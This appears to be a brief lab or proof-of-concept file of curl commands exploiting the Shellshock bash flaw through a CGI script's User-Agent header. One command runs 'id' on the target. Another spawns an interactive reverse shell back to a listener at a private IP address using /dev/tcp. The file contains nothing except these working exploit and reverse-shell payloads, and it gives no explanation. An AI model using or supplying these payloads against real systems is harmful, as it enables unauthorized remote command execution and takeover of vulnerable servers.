# export foo='() { :; }; bash'
curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id" 127.0.0.1:28080/victim.cgi
curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /bin/bash -i > /dev/tcp/172.30.46.229/9090 0<&1 2>&1" 127.0.0.1:28080/victim.cgi